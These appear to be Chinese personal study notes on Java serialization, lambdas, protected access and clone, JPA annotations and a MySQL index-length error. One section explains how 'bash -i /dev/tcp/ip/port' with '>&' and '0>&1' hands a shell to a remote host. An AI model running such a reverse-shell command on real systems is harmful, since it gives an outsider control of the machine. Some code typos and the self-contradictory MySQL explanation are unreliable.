保存和加载序列化对象

当我们学习IO的处理流时会介绍到ObjectInputStream和ObjectOutputStream这两种处理流的类,用于存储和读取基本数据类型或者对象流

其实IO的处理流的类都是”工具”类,用于解析流成我们需要的格式.

如往employee.dat文件 存入对象,再读取回来:

若想对象实现以上的操作,则这些类必须实现Serializable接口:

class Employee implements Serializable{...}

但不需要实现任何方法

重要情况:当一个对象被多个对象共享,作为共享的对象,被序列化时我们也要保证这一属性的一致性,但是我们并不能将对象的内存地址也保存下来,因为对象恢复时,也不可能恢复与原来完全相同的内存地址.

因此每个对象被序列化时都会用一个序列号(serial number)保存的,如果第一次遇到,保存其对象数据到输出流中,如果以保存过,仅记录”与之前保存过的序列号为x的对象相同”.读取的过程也是如此;

dev是设备(device)的英文缩写。这里主要存放与设备（包括外设）有关的文件，Linux一切皆文件

**/dev/tcp/**是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/

>& 和 0>&1

Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件。

所有执行I/O操作的系统调用都会通过文件描述符，即文件描述符可控制输入输出（输入/输出重定向****）

标准输入(stdin): 代码为 0 使用 < 或 << 默认设备键盘

标准输出(stdout): 代码为 1 使用 > 或 >> 默认设备显示器

标准错误输出(stderr): 代码为 2 使用 2> 或 2>> 默认设备显示器

>& 和 0>&1都有>&但是有不同的涵义

单独的>& ,代表标准错误输出(stderr)合并到标准输出(stdout)中 , >&word 等价于 &> word 都相当于 > word 2>&1

**>&**后面带有数字或者’-‘, 表示复制操作,如0>&1表示将标准输入(stdin)复制到了标准输出(stdout)里

本身这个bash -i /dev/tcp/ip/port就已经将 1 默认重定位到了ip所在主机上,再>&将2重定向到1里,0>&1也将输入定位到了标准输出里,所以0,1,2全都定位到了ip所在主机上了

lambda表达式

2022-01-09

完全参考自: java核心技术.卷1 6.2 lambda表达式一节,辅助以下笔记阅读

为什么引入lambda表达式:某些接口设计出来的目的只是为了完成一个函数,如comparator接口.用于比较排序.如果每次都要为实现这个接口构造一个类出来,则过于繁琐.我们的根本目的还是使用接口中提供的compare函数,因此如果能将繁琐的实现接口的过程,转换为传递函数.那么整个工作将会简单很多.

哪些接口能使用lambda表达式:函数式接口,即接口满足只有一个抽象方法.(即使接口有一个方法,但可能不是抽象方法)

**lambda表达式的语法:**参考书6.2.2,个人建议需要明确写出返回方法

将lambda表达式简单的看成函数的传递:把它看作是一个函数,而不是一个对象.但它不是真的函数,往往是根据某个函数式接口,我们写了一个方法,方法的参数需要传递这个接口.即函数式接口是有归属的,而不是简单的指定参数和返回类型的方法.

方法引用:参考自6.2.4

为了理解,我个人将方法引用这种方式,理解为lambda表达式的另类写法,即引用别人写好的方法,有其应用场景的局限性

应用的三种情况:

说明 :: 运算符,用于分隔方法名与对象或类名

1.object::instanceMethod 对应例子 Timer timer=new Timer(1000,System.out.out:prinln);

等价于 x->System.out.prinln(x), 适用于于只需要往方法中传递参数的情况

2.Class::instanceMethod 对应例子: Arrays.sort(strings,String::compareToIgnoreCase)

等价于(x,y)->x.compareToIgnoreCase(y),适用于第一个参数成为隐含参数,来调用这个方法

3.Class::staticMethod 对应例子: Math::pow

等价于(x,y)->Math.pow(x,y) 适用于所有参数都传递到静态方法中

局限性:只有当lambda表达式的body,只调用一个方法而不做其他操作时,才能写成方法引用

编译器最终是会将你的方法引用写法,编译时转换成函数式接口的实例

lambda表达式的变量作用域

详细了解参考6.2.6,下面只是辅助阅读的理解

lambda表达式分三个部分:

1.一个代码块

2.参数

3.自由变量的值,这是指非参数而且不在代码中定义的变量

在lambda表达式中访问外围方法或者类中的变量(即3),是有局限性的.

总结来说只能访问不会改变的变量,又称effectively final 即这个变量初始化后不会再为它赋新的值.如String,这是因为lambda表达式的数据结构另存了自由变量的值

注意:

另外在lambda表达式中不能声明与局部变量同名的参数

此外如果在lambda表达式中使用this关键词,是指创建这个lambda表达式的方法的this参数

关于protected（受保护访问）

看了java核心技术关于此处的讲解，又重新梳理了一遍

新理解：

无论在何处使用此权限标记的字段（当然ide会自动检查错误），都要考虑以下规则

private——仅对本类可见（在本类的代码中可以使用，其他地方都不行）

public——对外部完全可见

protected–对本包和所有子类可见

默认(default)–对本包可见

解释：

1.任何声明private的内容对其他类都是不可见的，即使是子类也不行，但是在某些时候你会希望允许子类的方法访问超类的某个字段或方法，为此需要将该方法或者字段声明未protected。

2.如父类Employee中有hireDay字段声明为protected，因此子类A中方法就可以访问子类A的该hireDay字段，即使子类位置不在父类本包下。

3.如过此时还有个子类B，但此时子类A的方法中就不能访问B的hireDay字段，即派生子类不能互相访问

注意：实际应用中，很少使用protected修饰字段，甚至是谨慎使用

它的用处：更对情况下是修饰方法，限制住某个方法的使用。这表明子类（可能很熟悉父类）得到了信任，可以正确使用该方法，而其他类不行。

clone方法

例：Object类中的clone方法的使用，它就只能在本包和子类中使用。

这就表明clone方法的调用，并不是在任何地方都可以的，只有在本包和子类中了解clone方法的人甚至该类的设计者才可以。

object类中默认的clone方法是”浅拷贝“，如果进行拷贝那么原对象和克隆对象中的子对象其实是共享的。

所以对于一个类，需要确定：

1.默认的clone方法是否满足要求

2.是否可以在可变的子对像上调用clone来修补默认的clone方法

3.是否不该使用clone

实际上第三个是默认选项，如果选择第1或者第2项，类必须：

1.实现Cloneable接口

2.重新定义clone方法，并指定public访问修饰符

更具体的使用细节参考java核心技术6.1.9，当然clone也不常用

旧理解：

public: 被public修饰的类成员能被 所有的类访问

private: 是能在被定义的类中访问

不修饰: 包访问权限,只能被同一包中的类访问

protected: 被protected修饰的成员对于本包和其子类可见,可用

本包可见:理解成,在本包中调用此类的protected方法

如包com.jinlei.bao1中的类A 是继承object的

子类可见可用:理解成只能在子类A中,利用子类实例化对象调用protected方法如clone(),才可以成功. 如果只是子类中单纯new object()的实例化对象是不能用clone()方法的. 同样在任何非object包下的类B中,new A()实例也是不能调用clone()方法的

根本原因如下(可以不看,说的不好,不准确):

如果以修饰方法函数为例,方法函数经过编译后会暴露方法访问的二进制地址,以此修饰方法,本身代表了一种访问权限

例如:java.lang包中的类Object

包com.jinlei.bao2中的类B 默认extends Object

当我们在类B中,将类Object new成实例A后,再在代码中使用类中的方法如A.clone(),当我们编译的时候,我们就需要去找这些方法的二进制地址,将其加入编译后的文件

但是如果此时类Object中的clone()方法修饰为protected,那么当编译后,此方法的二进制访问入口,只会暴露给java.lang包和类Object的子类. 因此B在编译的时候想找二进制入口,但是会找不到,于是编译失败.

因此对于protected修饰,应该加上一句:且本包和其子类,不可将此二进制访问入口交给给非本包和非子类,即使是孙子类

而且子类可见,要进行区分,只是子类可见super的二进制访问入口,而不是任何一个父类的实例

实体类

用于建立实体类与数据库表的映射,同时也包括建表的一些规则

@SuppressWarnings(“serial”)
@Data
@Accessors(chain = true)
@ToString(callSuper = true)
@EqualsAndHashCode(callSuper = true)
这五个注解与本文介绍内容无关,作用分别是
@SuppressWarnings(“serial”)压制idea关于序列号提示的警告,
@Data lombok中的注解,主要是提供getter和setter方法等等
@Accessors(chain = true) lombok中开启链式编程,保证get,set方法返回值是this,原来是没有返回值的

@ToString(callSuper = true) lombok中@Data注解, 调用toString时只会打印子类本身的属性值, 如果想要打印父类的属性,则需子类加上@Data和@ToString(callSuper = true)两个注解, 父类也使用注解@Data

@EqualsAndHashCode(callSuper = true) lombok中的注解,用于比较两个实体类是否相同,如果不加此注解则只会比较子类中的属性,加了后还会比较父类的属性

有关jpa:

@Entity(name = “encrypt_keys_info”) 表明该类是实体类,用于jpa,name=* 可不加

@Table(name = “encrypt_keys_info”, indexes = { @Index(name = “user_id”, columnList = “user_id”),@Index(name = “key_address”, columnList = “key_address”) })
很长一串,Table注解表明对应的数据库中的表格相关属性,name=表格名,indexes表明对该表格生成的索引,name(可选)表示数据库建表生成index的名称,columList表示哪些列要被加入index

在实体类中的每个属性上,加上@Column注解,name表示该列的名称

@Id表示该属性是主键
@@GeneratedValue(strategy = GenerationType.IDENTITY)表示主键的生成策略

无法创建key或者index,报错超过767bytes

当数据库中创建的表采用的是引擎是InnoDB,此时在默认情况下会要求创建的key或者index的长度不能超过767bytes,当然在经过特殊设置后可以超过.

那么报错肯定是key的长度超出了,一般我们设置varchar类型长度会为255,此时该varchar类型是utf8编码,则varchar类型占三个字节,255*3<767

此时就会报错

因此必须将改回utf8,才能正常.如果表已经创建了,可以删除后重新建表
